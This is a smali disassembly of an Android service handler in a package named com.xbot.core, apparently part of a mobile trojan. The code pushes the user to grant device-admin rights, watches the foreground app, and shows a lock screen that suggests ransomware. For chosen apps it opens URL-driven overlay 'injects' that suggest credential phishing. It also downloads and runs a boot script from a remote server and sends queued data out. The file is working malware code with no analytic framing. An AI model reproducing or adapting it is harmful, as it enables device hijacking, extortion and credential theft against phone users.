.class final Lcom/xbot/core/RunService$1;
.super Landroid/os/Handler;
.source "RunService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/xbot/core/RunService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .prologue
    .line 322
    invoke-direct {p0}, Landroid/os/Handler;-><init>()V

    return-void
.end method


# virtual methods
.method public handleMessage(Landroid/os/Message;)V
    .locals 13
    .param p1, "msg"    # Landroid/os/Message;

    .prologue
    const/16 v12, 0x29a

    const/16 v11, 0x22b

    const/4 v10, 0x2

    const/4 v9, 0x0

    const/4 v8, 0x1

    .line 327
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lcom/xbot/core/RunService;->isAdminActive()Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-nez v5, :cond_0

    .line 329
    new-instance v0, Landroid/content/Intent;

    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    const-class v6, Lcom/xbot/core/AdminActivity;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 330
    .local v0, "intent":Landroid/content/Intent;
    const/high16 v5, 0x10000000

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 331
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5, v0}, Lcom/xbot/core/RunService;->startActivity(Landroid/content/Intent;)V

    .line 337
    .end local v0    # "intent":Landroid/content/Intent;
    :cond_0
    iget v5, p1, Landroid/os/Message;->what:I

    if-ne v5, v11, :cond_5

    .line 339
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lcom/xbot/core/RunService;->getActivityManager()Landroid/app/ActivityManager;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v4

    .line 340
    .local v4, "tasks":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    invoke-interface {v4}, Ljava/util/List;->size()I

    move-result v5

    if-eqz v5, :cond_3

    .line 342
    invoke-interface {v4, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v5, v5, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    invoke-virtual {v5}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v2

    .line 344
    .local v2, "name":Ljava/lang/String;
    sget-object v5, Lcom/xbot/core/Consts;->locker:Ljava/lang/Boolean;

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-ne v5, v8, :cond_1

    const-class v5, Lcom/xbot/core/locker/Lock;

    invoke-virtual {v5}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1

    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lcom/xbot/core/RunService;->getSettings()Lcom/xbot/core/Settings;

    move-result-object v5

    const-string v6, "locker"

    invoke-virtual {v5, v6}, Lcom/xbot/core/Settings;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "false"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1

    .line 346
    new-instance v0, Landroid/content/Intent;

    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    const-class v6, Lcom/xbot/core/locker/Lock;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 347
    .restart local v0    # "intent":Landroid/content/Intent;
    const/high16 v5, 0x10000000

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 348
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5, v0}, Lcom/xbot/core/RunService;->startActivity(Landroid/content/Intent;)V

    .line 351
    .end local v0    # "intent":Landroid/content/Intent;
    :cond_1
    invoke-static {}, Lcom/xbot/core/RunService;->access$000()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_3

    .line 353
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "new activity: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/xbot/core/Log;->write(Ljava/lang/String;)V

    .line 354
    invoke-static {}, Lcom/xbot/core/RunService;->access$100()Ljava/util/HashMap;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_2

    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lcom/xbot/core/RunService;->getSettings()Lcom/xbot/core/Settings;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, ".inject"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Lcom/xbot/core/Settings;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "false"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_2

    .line 356
    invoke-static {}, Lcom/xbot/core/RunService;->access$100()Ljava/util/HashMap;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/String;

    invoke-static {v5}, Lcom/xbot/core/activities/Inject;->setURL(Ljava/lang/String;)V

    .line 357
    invoke-static {}, Lcom/xbot/core/RunService;->access$200()Lcom/xbot/core/xAPI;

    move-result-object v5

    const-class v6, Lcom/xbot/core/activities/Inject;

    invoke-virtual {v5, v6}, Lcom/xbot/core/xAPI;->StartNewActivity(Ljava/lang/Class;)V

    .line 359
    :cond_2
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lcom/xbot/core/RunService;->getScriptLoader()Lcom/xbot/core/ScriptLoader;

    move-result-object v5

    const-string v6, "onWindowChange"

    new-array v7, v8, [Ljava/lang/Object;

    aput-object v2, v7, v9

    invoke-virtual {v5, v6, v7}, Lcom/xbot/core/ScriptLoader;->call(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 360
    invoke-static {v2}, Lcom/xbot/core/RunService;->access$002(Ljava/lang/String;)Ljava/lang/String;

    .line 364
    .end local v2    # "name":Ljava/lang/String;
    :cond_3
    sget-object v5, Lcom/xbot/core/RunService;->onTickHandler:Landroid/os/Handler;

    const-wide/16 v6, 0x64

    invoke-virtual {v5, v11, v6, v7}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    .line 374
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lcom/xbot/core/RunService;->netConnect()V

    .line 375
    invoke-static {}, Lcom/xbot/core/RunService;->access$300()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v5

    if-eqz v5, :cond_4

    .line 377
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lcom/xbot/core/RunService;->getScriptLoader()Lcom/xbot/core/ScriptLoader;

    move-result-object v5

    const-string v6, "bootScriptNet"

    invoke-static {}, Lcom/xbot/core/RunService;->access$300()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Lcom/xbot/core/ScriptLoader;->loadScript(Ljava/lang/String;Ljava/lang/String;)Lcom/xbot/core/Script;

    .line 378
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "bootScript loaded"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-static {}, Lcom/xbot/core/RunService;->access$300()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/xbot/core/Log;->write(Ljava/lang/String;)V

    .line 379
    const-string v5, ""

    invoke-static {v5}, Lcom/xbot/core/RunService;->access$302(Ljava/lang/String;)Ljava/lang/String;

    .line 380
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v5}, Lcom/xbot/core/RunService;->access$402(Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 382
    :cond_4
    invoke-static {}, Lcom/xbot/core/RunService;->access$500()Ljava/util/Queue;

    move-result-object v5

    invoke-interface {v5}, Ljava/util/Queue;->poll()Ljava/lang/Object;

    move-result-object v3

    .line 383
    .local v3, "o":Ljava/lang/Object;
    if-eqz v3, :cond_5

    .line 385
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5, v3}, Lcom/xbot/core/RunService;->sendNetPacket(Ljava/lang/Object;)V

    .line 388
    .end local v3    # "o":Ljava/lang/Object;
    .end local v4    # "tasks":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    :cond_5
    iget v5, p1, Landroid/os/Message;->what:I

    if-ne v5, v12, :cond_8

    .line 391
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lcom/xbot/core/RunService;->getScriptLoader()Lcom/xbot/core/ScriptLoader;

    move-result-object v5

    const-string v6, "doQuery"

    new-array v7, v9, [Ljava/lang/Object;

    invoke-virtual {v5, v6, v7}, Lcom/xbot/core/ScriptLoader;->call(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 406
    invoke-static {}, Lcom/xbot/core/RunService;->access$600()Landroid/os/PowerManager$WakeLock;

    move-result-object v5

    if-eqz v5, :cond_7

    .line 408
    invoke-static {}, Lcom/xbot/core/RunService;->access$600()Landroid/os/PowerManager$WakeLock;

    move-result-object v5

    invoke-virtual {v5}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v5

    if-eqz v5, :cond_6

    .line 409
    invoke-static {}, Lcom/xbot/core/RunService;->access$600()Landroid/os/PowerManager$WakeLock;

    move-result-object v5

    invoke-virtual {v5}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 411
    :cond_6
    const/4 v5, 0x0

    invoke-static {v5}, Lcom/xbot/core/RunService;->access$602(Landroid/os/PowerManager$WakeLock;)Landroid/os/PowerManager$WakeLock;

    .line 413
    :cond_7
    invoke-static {}, Lcom/xbot/core/RunService;->access$700()Landroid/os/PowerManager;

    move-result-object v5

    const v6, 0x10000001

    const-string v7, "LockTag"

    invoke-virtual {v5, v6, v7}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v5

    invoke-static {v5}, Lcom/xbot/core/RunService;->access$602(Landroid/os/PowerManager$WakeLock;)Landroid/os/PowerManager$WakeLock;

    .line 414
    invoke-static {}, Lcom/xbot/core/RunService;->access$600()Landroid/os/PowerManager$WakeLock;

    move-result-object v5

    invoke-virtual {v5}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 417
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lcom/xbot/core/RunService;->lockWifi()V

    .line 421
    sget-object v5, Lcom/xbot/core/RunService;->onTickHandler:Landroid/os/Handler;

    sget v6, Lcom/xbot/core/Consts;->queryDelay:I

    mul-int/lit16 v6, v6, 0x3e8

    int-to-long v6, v6

    invoke-virtual {v5, v12, v6, v7}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    .line 428
    :cond_8
    iget v5, p1, Landroid/os/Message;->what:I

    if-ne v5, v10, :cond_9

    .line 430
    invoke-static {}, Lcom/xbot/core/Network;->register()Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-nez v5, :cond_a

    .line 432
    sget-object v5, Lcom/xbot/core/RunService;->onTickHandler:Landroid/os/Handler;

    const-wide/16 v6, 0x2710

    invoke-virtual {v5, v10, v6, v7}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    .line 441
    :cond_9
    :goto_0
    return-void

    .line 435
    :cond_a
    const-string v5, "bootScriptNet"

    invoke-static {v5}, Lcom/xbot/core/Network;->getScript(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 436
    .local v1, "js":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "boot.script: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/xbot/core/Log;->write(Ljava/lang/String;)V

    .line 438
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lcom/xbot/core/RunService;->getScriptLoader()Lcom/xbot/core/ScriptLoader;

    move-result-object v5

    const-string v6, "bootScriptNet"

    invoke-virtual {v5, v6, v1}, Lcom/xbot/core/ScriptLoader;->loadScript(Ljava/lang/String;Ljava/lang/String;)Lcom/xbot/core/Script;

    goto :goto_0
.end method
